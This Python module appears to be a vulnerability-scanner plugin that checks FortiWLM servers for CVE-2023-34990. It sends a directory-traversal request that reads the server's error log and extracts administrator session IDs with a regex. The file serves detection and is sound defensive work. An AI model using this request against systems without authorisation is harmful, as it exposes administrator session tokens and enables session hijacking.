"""Agent Asteroid implementation for CVE-2023-34990"""

import re
import datetime

import requests

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)

VULNERABILITY_TITLE = "FortiWLM Directory Traversal"
VULNERABILITY_REFERENCE = "CVE-2023-34990"
VULNERABILITY_DESCRIPTION = (
    "CVE-2023-34990 is a critical flaw in FortiWLM that allows unauthenticated attackers to exploit the /ems/cgi-bin/ezrf_lighttpd.cgi "
    "endpoint by injecting directory traversal sequences (../) into the imagename parameter. "
    "This grants attackers access to sensitive log files, including administrator session tokens, enabling session hijacking and "
    "access to restricted endpoints. The following versions of FortiWLM are impacted by CVE-2023-34990:"
    "FortiWLM 8.5: Versions 8.5.0 through 8.5.4"
    "FortiWLM 8.6: Versions 8.6.0 through 8.6.5"
)
RISK_RATING = "CRITICAL"

EXPLOIT_URL = "/ems/cgi-bin/ezrf_lighttpd.cgi?op_type=upgradelogs&imagename=../../../../../../../../../data/apps/nms/logs/httpd_error_log"


def _fetch_log_file(target_url: str) -> str:
    """
    Sends a crafted request to fetch the log file containing sensitive information.

    Args:
        target_url: The full URL to the vulnerable endpoint.

    Returns:
        The content of the log file, if accessible, or an empty string.
    """
    try:
        response = requests.get(
            target_url, timeout=DEFAULT_TIMEOUT.seconds, verify=False
        )
        if response.status_code == 200:
            return response.text
    except requests.RequestException:
        pass

    return ""


def _extract_session_id(log_content: str) -> list[str]:
    """
    Extracts session IDs from the log file content.

    Args:
        log_content: The content of the fetched log file.

    Returns:
        A list of extracted session IDs.
    """
    session_ids = re.findall(r"sessionid=([A-F0-9]+)", log_content)
    return session_ids


@exploits_registry.register
class CVE202334990Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(
        method="GET", path="/ems/cgi-bin/ezrf_lighttpd.cgi"
    )
    accept_pattern = [re.compile("<title>FortiWLM Login</title>")]

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        target_url = f"{target.origin}{EXPLOIT_URL}"
        log_content = _fetch_log_file(target_url)

        if log_content != "":
            session_ids = _extract_session_id(log_content)
            if session_ids:
                vulnerability = self._create_vulnerability(target)
                vulnerabilities.append(vulnerability)

        return vulnerabilities

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
